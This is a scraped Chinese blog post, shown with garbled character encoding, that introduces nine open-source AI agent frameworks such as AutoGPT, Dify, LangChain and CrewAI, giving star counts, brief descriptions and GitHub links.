            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é€›é€›GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:40:59.000Z" title="Tue Dec 30 2025 02:40:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">01ã€AutoGPT</h2>
<p>AutoGPT æ˜¯ AI Agent é¢†åŸŸçš„é¼»ç¥–çº§é¡¹ç›®ï¼Œç°åœ¨å·²ç» 18 ä¸‡+çš„ Star äº†ã€‚</p>
<p>ä¸èŠå¤©æœºå™¨äººä¸ä¸€æ ·ï¼ŒAutoGPT èƒ½å¤Ÿè‡ªä¸»åœ°å°†ä¸€ä¸ªå¤§ç›®æ ‡æ‹†è§£ä¸ºå­ä»»åŠ¡ï¼Œå¹¶åˆ©ç”¨äº’è”ç½‘æœç´¢ã€æœ¬åœ°æ–‡ä»¶ç­‰æ“ä½œæ¥ä¸€æ­¥æ­¥å®ç°ç›®æ ‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d15a803954748b794f8f24af0d1513f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=7ZSuZwQl0DuecGredJzmwCleVMk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>AutoGPTÂ å…·å¤‡å¼ºå¤§çš„å·¥å…·è°ƒç”¨å’Œç¯å¢ƒäº¤äº’èƒ½åŠ›ã€‚</p>
<p>å®ƒèƒ½å¤Ÿé€šè¿‡è®¿é—®äº’è”ç½‘æœç´¢æœ€æ–°ä¿¡æ¯ã€ç®¡ç†æœ¬åœ°æ–‡ä»¶çš„è¯»å†™ã€æ‰§è¡Œä»£ç ä»¥åŠä¿ç•™é•¿æœŸå’ŒçŸ­æœŸè®°å¿†æ¥è¾…åŠ©å†³ç­–ã€‚</p>
<p>æ ¸å¿ƒæœºåˆ¶æ˜¯ä¸€ä¸ªæ€è€ƒ-è®¡åˆ’-è¡ŒåŠ¨çš„å¾ªç¯ï¼šæ¨¡å‹ä¼šè¯„ä¼°å½“å‰çŠ¶æ€ï¼Œåˆ¶å®šä¸‹ä¸€æ­¥è®¡åˆ’ï¼Œæ‰§è¡Œæ“ä½œï¼Œå¹¶æ ¹æ®åé¦ˆç»“æœè¿›è¡Œè‡ªæˆ‘ä¿®æ­£ï¼Œè¿™ä½¿å¾—å®ƒèƒ½å¤Ÿå¤„ç†æ¯”å•ä¸€å¯¹è¯æ›´å¤æ‚ã€è€—æ—¶æ›´é•¿çš„è‡ªåŠ¨åŒ–å·¥ä½œæµã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7831bb35425246cd8064ef98b24fcb56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=apxu09aN1u6De4lw0PMmgMH99jA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>AutoGPT è¿™ä¸ªå¼€æºé¡¹ç›®ç»å¯¹æ˜¯æ¨åŠ¨ AI Agent é¢†åŸŸçš„å¿«é€Ÿå‘å±•ï¼Œæ˜¯ç ”ç©¶è‡ªä¸»æ™ºèƒ½ä½“ï¼ˆAutonomous Agentsï¼‰çš„å¿…çœ‹é¡¹ç›®ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/Significant-Gravitas/AutoGPT</span>
</code></pre>
<h2 data-id="heading-1">02ã€Dify</h2>
<p>Dify ç›®å‰ 12 ä¸‡+ çš„ Star äº†ã€‚</p>
<p>å®ƒä¸ä»…ä»…æ˜¯ Agent æ¡†æ¶ï¼Œè¿˜æ˜¯èåˆäº†Â Backend-as-a-Service (BaaS)Â å’ŒÂ LLMOpsÂ ç†å¿µçš„å¤§æ¨¡å‹åº”ç”¨å¼€å‘å¹³å°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a43a64ad52f243cb8683e667c9fbf1d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=HvrUAGWq1Uk7y5G0U9drAFhW%2Bpg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒæä¾›äº†å¯è§†åŒ–çš„ Prompt ç¼–æ’ã€è¿è¥ç®¡ç†ã€çŸ¥è¯†åº“ RAG é›†æˆç­‰åŠŸèƒ½ã€‚</p>
<p>é€šè¿‡ Difyï¼Œä¸éœ€è¦ä»å¤´ç¼–å†™åç«¯ä»£ç ï¼Œå³å¯å¿«é€Ÿå°†ç®€å•çš„ Prompt è½¬åŒ–ä¸ºåŠŸèƒ½å®Œå¤‡ã€å¯æŠ•å…¥ç”Ÿäº§çš„ AI åº”ç”¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fcbe7e91c4684989b65eeb05fd5b7cb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=Lq5w%2B65jpboqWSCjLIBNgTJ1Q3o%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Dify æ”¯æŒå¯è§†åŒ–ç¼–æ’ï¼Œæ‹–æ‹½èŠ‚ç‚¹æ¥å®šä¹‰å¤æ‚çš„ Agent é€»è¾‘å’Œå·¥å…·è°ƒç”¨ã€‚å¹¶ä¸”å†…ç½®äº†é«˜è´¨é‡çš„ RAG å¼•æ“ï¼Œèƒ½å¤Ÿè‡ªåŠ¨å¤„ç†æ–‡æ¡£è§£æã€åˆ†æ®µå’Œå‘é‡åŒ–ï¼Œè½»æ¾æ„å»ºä¼ä¸šçº§çŸ¥è¯†åº“ã€‚</p>
<p>å®ƒæä¾›äº†å¯è§†åŒ–çš„ Prompt ç¼–æ’ã€è¿è¥ç®¡ç†ã€çŸ¥è¯†åº“ RAG é›†æˆç­‰åŠŸèƒ½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dff16b1fee6d42d780fecfb4cf9fc322~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=KcTG%2FDNmyxODXdktRaf8JE7iCyA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å…³äºå®ƒå’Œ Difyã€n8nã€Coze çš„åŒºåˆ«ï¼Œè®© Nano Banana Pro ç”»äº†ä¸€ä¸ªå›¾ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39f04fc6ff9e4cad9740635e39518e1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=COOHlWw1fKrLqAT7Z6XectdHwYQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/langgenius/dify</span>
</code></pre>
<h2 data-id="heading-2">03ã€LangChain</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd4f409de25840b0ac52430a3278767c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=G3RAoItbkpnuSCP%2FGLtBeOc3jYM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è™½ç„¶ LangChain æ˜¯ä¸€ä¸ªé€šç”¨çš„ LLM å¼€å‘æ¡†æ¶ï¼Œä½†å®ƒç›®å‰æ˜¯æ„å»º Agent çš„äº‹å®æ ‡å‡†åŸºç¡€è®¾æ–½ä¹‹ä¸€ã€‚</p>
<p>å¯¹äºåˆå­¦è€…æ¥è¯´ï¼Œå®ƒçš„å­¦ä¹ æ›²çº¿è¿˜æ˜¯å¾ˆé™¡å³­çš„ï¼Œä¸€æ—¦æŒæ¡äº†ä¼šå‘ç°å®ƒç¡®å®æ˜¯æ„å»ºå¤æ‚é€»è¾‘æœ€ç¨³å¥çš„åœ°åŸºã€‚</p>
<p>å®ƒæœ‰å¾ˆå¤šé«˜åº¦æ¨¡å—åŒ–çš„ç»„ä»¶ï¼ŒåŒ…æ‹¬é“¾ Chainsã€ä»£ç† Agents å’Œè®°å¿† Memoryã€‚</p>
<p>å¼€å‘è€…å¯ä»¥åƒæ­ç§¯æœ¨ä¸€æ ·ï¼Œå°†æç¤ºè¯ç®¡ç†ã€æ–‡æ¡£åŠ è½½ã€å‘é‡æ£€ç´¢ä»¥åŠæ¨¡å‹è°ƒç”¨ä¸²è”æˆä¸€ä¸ªå®Œæ•´çš„å·¥ä½œæµã€‚</p>
<p>ç‰¹åˆ«æ˜¯å…¶å¼ºå¤§çš„ Agent æœºåˆ¶ï¼Œå¤§æ¨¡å‹å……å½“æ¨ç†å¼•æ“ï¼ŒåŠ¨æ€å†³å®šè°ƒç”¨å“ªäº›å¤–éƒ¨å·¥å…·ï¼Œæ¯”å¦‚ Google æœç´¢ã€è®¡ç®—å™¨æˆ– API å•¥çš„æ¥è§£å†³é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7615873691aa43eca8bc880825c68cd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=6Nh%2FMZSWbA3%2BO6r43A%2BNDj4mwiU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç‰¹åˆ«æ˜¯å…¶å­é¡¹ç›®Â LangGraphï¼Œä¸“é—¨ç”¨äºæ„å»ºæœ‰çŠ¶æ€çš„ã€å¤šè§’è‰²çš„ Agent åº”ç”¨ã€‚</p>
<p>å®ƒæä¾›äº†é«˜åº¦å¯æ§çš„å¾ªç¯è®¡ç®—èƒ½åŠ›ï¼Œè®©å¼€å‘è€…èƒ½å¤Ÿç²¾ç»†åœ°æ§åˆ¶ Agent çš„å†³ç­–æµç¨‹ï¼Œæ˜¯ Python å¼€å‘è€…æ„å»ºå¤æ‚ Agent çš„é¦–é€‰åº•å±‚æ¡†æ¶ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/langchain-ai/langchain</span>
</code></pre>
<h2 data-id="heading-3">04ã€MetaGPT</h2>
<p>MetaGPT ç°åœ¨åœ¨ GitHub ä¸Šæœ‰ 6 ä¸‡å¤š Star äº†ã€‚Â </p>
<p>å¦‚æœæƒ³ç ”ç©¶å¤šæ™ºèƒ½ä½“åä½œï¼Œè¿™ä¸ªå¼€æºé¡¹ç›®å¯ä»¥è¯´æ˜¯æœ€é‡è¦çš„æ¡†æ¶ä¹‹ä¸€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3206b7f4522b46e4b09e5e958c73eeda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=Vvq0q%2B6XhJNdZEESiMqsNp5Y9F0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒæ¨¡æ‹Ÿäº†ä¸€ä¸ªè™šæ‹Ÿçš„è½¯ä»¶å…¬å¸ï¼Œå†…éƒ¨åŒ…å«äº§å“ç»ç†ã€æ¶æ„å¸ˆã€é¡¹ç›®ç»ç†å’Œå·¥ç¨‹å¸ˆç­‰ä¸åŒè§’è‰²çš„ Agentã€‚</p>
<p>åªè¦è¾“å…¥ä¸€å¥è¯éœ€æ±‚ï¼Œè¿™äº›Â Agent å°±ä¼šååŒå·¥ä½œï¼Œè¾“å‡ºç”¨æˆ·æ•…äº‹ã€ç«å“åˆ†æã€è®¾è®¡å›¾ç”šè‡³å¯è¿è¡Œçš„ä»£ç ã€‚</p>
<p>é€‚åˆå¯¹å¤šæ™ºèƒ½ä½“åä½œï¼ˆMulti-Agent Collaborationï¼‰æ„Ÿå…´è¶£çš„å¼€å‘è€…ï¼Œç‰¹åˆ«é€‚åˆé‚£ç§æµç¨‹å›ºå®šã€å¯¹è¾“å‡ºç¨³å®šæ€§è¦æ±‚é«˜çš„åœºæ™¯ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/geekan/MetaGPT</span>
</code></pre>
<h2 data-id="heading-4">05ã€Microsoft AutoGen</h2>
<p>å¾®è½¯å¼€æºçš„æ¡†æ¶ï¼Œä¹‹å‰ä¹Ÿä»‹ç»è¿‡ï¼Œç°åœ¨å·²ç» Â çš„ Star äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fac7399e0e6477cb6e81643f73a6e26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=pOvi7KG5ZNN3MuLxM8F%2FynI%2B6Tc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒä¸“æ³¨äºå¤šæ™ºèƒ½ä½“å¯¹è¯ã€‚å¯ä»¥å®šä¹‰å¤šä¸ªå¯ä»¥ç›¸äº’å¯¹è¯çš„ Agentï¼Œå¯ä»¥æ˜¯ LLMã€äººç±»æˆ–å·¥å…·ï¼Œå®ƒä»¬é€šè¿‡å¯¹è¯æ¥åä½œè§£å†³ä»»åŠ¡ã€‚</p>
<p>è¯¥æ¡†æ¶é«˜åº¦æŠ½è±¡å’Œçµæ´»ï¼Œæ”¯æŒå¤šç§å¯¹è¯æ¨¡å¼ï¼Œæ˜¯ç›®å‰å·¥ä¸šç•Œå’Œå­¦æœ¯ç•Œæ¢ç´¢å¤šæ™ºèƒ½ä½“ç³»ç»Ÿï¼ˆMulti-Agent Systemsï¼‰æœ€ä¸»æµçš„æ¡†æ¶ä¹‹ä¸€ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/microsoft/autogen</span>
</code></pre>
<h2 data-id="heading-5">06ã€Flowise</h2>
<p>Flowise æ˜¯ä¸€ä¸ªä½ä»£ç /æ— ä»£ç çš„ UI å¯è§†åŒ–å·¥å…·ï¼Œç°åœ¨Â 48k çš„ Star äº†ã€‚</p>
<p>å¦‚æœä½ è¢« LangChain æ™¦æ¶©çš„æ–‡æ¡£åŠé€€äº†ï¼Œä¸å¦¨å…ˆè¯•è¯• Flowiseã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4341a3a4c7244f2a988f09f4cdcef716~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=DEBpjempwFKd8kPtL5JDOwmIxBI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>é€šè¿‡æ‹–æ‹½çš„æ–¹å¼æ„å»ºå¤§æ¨¡å‹åº”ç”¨ï¼Œå®ƒåº•å±‚åŸºäº LangChainï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿æ¥ä¸åŒçš„èŠ‚ç‚¹ï¼Œæ¯”å¦‚ PDF åŠ è½½å™¨ã€OpenAI æ¨¡å‹ã€Agentæ‰§è¡Œå™¨ç­‰æ¥æ„å»ºè‡ªå®šä¹‰çš„é€»è¾‘æµã€‚</p>
<p>å¯¹äºä¸æ“…é•¿å†™ä»£ç ä½†æƒ³å¿«é€Ÿæ­å»º Agent åŸå‹çš„ç”¨æˆ·æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å‹å¥½çš„å¹³å°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/171489b99ad84bbba58b1a11c2082466~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=koq0WLRV00hK30uJwIspJ49ju%2FM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/FlowiseAI/Flowise</span>
</code></pre>
<h2 data-id="heading-6">07ã€CrewAI</h2>
<p>CrewAI æ˜¯è¿‘å¹´æ¥å¼‚å†›çªèµ·çš„ Python æ¡†æ¶ï¼Œå®ƒä¸»æ‰“è§’è‰²æ‰®æ¼”ï¼ˆRole-Playingï¼‰çš„ç¼–æ’ï¼ŒÂ ç°åœ¨å·²ç» 42k çš„ Star äº†ã€‚</p>
<p>è¿™ä¸ªå¼€æºé¡¹ç›®ä¸åƒ AutoGen é‚£ä¹ˆæŠ½è±¡ï¼Œå†™ CrewAI çš„ä»£ç æ„Ÿè§‰å°±åƒæ˜¯åœ¨ç»™å‘˜å·¥å†™ä»»åŠ¡ä¹¦ï¼Œéå¸¸æ¸…æ™°æ˜“æ‡‚ï¼Œæ˜¯ Python å¼€å‘è€…ä¸Šæ‰‹å¤šæ™ºèƒ½ä½“çš„é¦–é€‰</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2675a5ed33a24f9ca93b62a02ddf2cf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=DM5Y%2BVfAMEbY5mfxWwmFzKkL92E%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒè®©å¼€å‘è€…å¯ä»¥è½»æ¾å®šä¹‰å…·æœ‰ç‰¹å®šè§’è‰²ã€ç›®æ ‡å’ŒèƒŒæ™¯æ•…äº‹çš„ Agentï¼Œå¹¶å°†å®ƒä»¬ç»„æˆä¸€ä¸ªå›¢é˜Ÿæ¥æŒ‰é¡ºåºæˆ–å±‚çº§æ‰§è¡Œä»»åŠ¡ã€‚</p>
<p>å®ƒçš„è®¾è®¡éå¸¸ç›´è§‚ï¼Œä¸ä»…æ˜“äºä¸Šæ‰‹ï¼Œè€Œä¸”èƒ½å¾ˆå¥½åœ°ä¸ LangChain å·¥å…·ç”Ÿæ€é›†æˆã€‚</p>
<pre><code class="hljs language-bash" lang="bash">å¼€æºåœ°å€: https://github.com/crewAIInc/crewAI
</code></pre>
<h2 data-id="heading-7">08ã€ChatDev</h2>
<p>è¿™ä¸ª 28K æ˜Ÿæ˜Ÿçš„å¼€æºé¡¹ç›®æ˜¯æ¸…åå¤§å­¦å›¢é˜Ÿ OpenBMB å¼€æºã€‚</p>
<p>ç±»ä¼¼äº MetaGPTï¼ŒChatDev ä¹Ÿæ˜¯æ‰“é€ äº†ä¸€ä¸ªè™šæ‹Ÿçš„è½¯ä»¶å¼€å‘å…¬å¸ã€‚</p>
<p>å®ƒé€šè¿‡èŠå¤©é“¾çš„æ–¹å¼ï¼Œè®©ä¸åŒè§’è‰²çš„æ™ºèƒ½ä½“ï¼ˆCEOã€CTOã€ç¨‹åºå‘˜ã€æµ‹è¯•å‘˜ï¼‰åœ¨å¦‚è®¾è®¡ã€ç¼–ç ã€æµ‹è¯•ã€æ–‡æ¡£ç­‰ç¯èŠ‚è¿›è¡Œæ·±åº¦åä½œã€‚</p>
<p>å…¶ç‰¹ç‚¹æ˜¯è¿‡ç¨‹å¯è§†åŒ–å¼ºï¼Œåƒæ˜¯åœ¨ç©ä¸€ä¸ªæ¨¡æ‹Ÿç»è¥æ¸¸æˆä¸€æ ·çœ‹ç€è½¯ä»¶è¢«å¼€å‘å‡ºæ¥ã€‚</p>
<p>çœ‹ç€ä¸€ä¸ªä¸ªå°äººå„¿åä½œå†™ä»£ç ç¡®å®å¾ˆæ²»æ„ˆï¼Œå®ƒä¸ºæˆ‘ä»¬å±•ç¤ºäº†æœªæ¥è½¯ä»¶å¼€å‘çš„ç»ˆæå½¢æ€ï¼Œéå¸¸æœ‰å¯å‘æ€§ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€:Â https:<span class="hljs-comment">//github.com/OpenBMB/ChatDev</span>
</code></pre>
<h2 data-id="heading-8">09ã€SuperAGI</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af0d5f8c881e4b8daa58fc27804a9455~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=4Z1pDxz%2Bmy8SakqTqACIWGlYN0U%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ä¸ªè‡ªä¸» AI æ™ºèƒ½ä½“æ¡†æ¶ç°åœ¨å·²ç» 15K çš„ Star äº†ã€‚å¯¹äºéœ€è¦é•¿æœŸç¨³å®šè¿è¡Œã€ç›‘æ§å¤šä¸ª Agent çš„ä¼ä¸šçº§åœºæ™¯æ¥è¯´ï¼Œè¿™ä¸ªå¼€æºé¡¹ç›®åŸºå»ºéå¸¸å¿…è¦ã€‚</p>
<p>å®ƒæœ‰ä¸€å¥—å®Œæ•´çš„åŸºç¡€è®¾æ–½ï¼Œå¼€å‘è€…ç”¨å®ƒå¯ä»¥æ„å»ºã€ç®¡ç†å’Œè¿è¡Œè‡ªä¸» Agentã€‚</p>
<p>å®ƒæ‹¥æœ‰å›¾å½¢åŒ–ç•Œé¢ã€Agent å¸‚åœºã€Toolsã€å¹¶å‘ä»£ç†è¿è¡Œç­‰åŠŸèƒ½ï¼Œæ—¨åœ¨è§£å†³ AutoGPT åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨éš¾çš„é—®é¢˜ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½æ¯”è¾ƒå®Œå¤‡çš„ Agent ç®¡ç†å¹³å°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f04b70bef3d34e97905144d77da2ff14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667259&amp;x-signature=xGWGREf0meFZ4cxVgVweVVIT8dg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è€Œä¸”è¿˜èƒ½é€šè¿‡å¯è§†åŒ–çš„ä»ªè¡¨ç›˜åŒæ—¶è¿è¡Œå’Œç›‘æ§å¤šä¸ª Agentï¼ŒæŸ¥çœ‹å…¶æ€ç»´é“¾ï¼ˆChain of Thoughtï¼‰å’Œæ‰§è¡Œæ—¥å¿—ã€‚</p>
